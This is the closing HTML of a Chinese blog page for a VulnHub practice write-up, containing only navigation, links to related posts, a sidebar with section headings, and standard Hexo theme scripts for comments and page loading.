class="label">下一篇</div><div class="next_info">打靶记录(二六)之VulnHubLuPinone</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/08/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83)%E4%B9%8BTHMInternal/" title="打靶记录(七)之THMInternal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-08</div><div class="title">打靶记录(七)之THMInternal</div></div></a></div><div><a href="/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%B9%9D)%E4%B9%8BTHMTheServerFromHell/" title="打靶记录(七九)之THMTheServerFromHell"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-24</div><div class="title">打靶记录(七九)之THMTheServerFromHell</div></div></a></div><div><a href="/2023/12/23/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E5%85%AB)%E4%B9%8BTHMBookStore/" title="打靶记录(七八)之THMBookStore"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-23</div><div class="title">打靶记录(七八)之THMBookStore</div></div></a></div><div><a href="/2023/12/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E5%8D%81)%E4%B9%8BTHMRacetrackBank/" title="打靶记录(七十)之THMRacetrackBank"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-17</div><div class="title">打靶记录(七十)之THMRacetrackBank</div></div></a></div><div><a href="/2023/07/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%89)%E4%B9%8BTHMGameZone/" title="打靶记录(三)之THMGameZone"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-02</div><div class="title">打靶记录(三)之THMGameZone</div></div></a></div><div><a href="/2023/08/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%89%E4%B8%80)%E4%B9%8BVulnhubMOMENTUM2/" title="打靶记录(三一)之VulnhubMOMENTUM2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-17</div><div class="title">打靶记录(三一)之VulnhubMOMENTUM2</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getshell"><span class="toc-number">3.</span> <span class="toc-text">Getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">5.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2023/08/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E4%B8%83)%E4%B9%8BVulnHubMORPHEUS/'
+    this.page.identifier = '/2023/08/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%BA%8C%E4%B8%83)%E4%B9%8BVulnHubMORPHEUS/'
+    this.page.title = '打靶记录(二七)之VulnHubMORPHEUS'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
